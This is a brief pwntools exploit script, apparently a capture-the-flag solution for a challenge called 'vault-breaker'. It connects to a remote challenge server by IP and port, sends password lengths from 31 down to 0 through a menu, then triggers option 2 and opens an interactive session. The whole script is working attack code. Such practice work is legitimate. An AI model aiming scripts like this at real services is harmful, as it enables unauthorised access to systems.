#!/usr/bin/env python3

from pwn import *

exe = ELF("./vault-breaker_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('94.237.62.166',36442)

for i in range(31,-1,-1):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'Length of new password (0-31): ',str(i).encode())

p.sendlineafter(b'> ',b'2')


p.interactive()
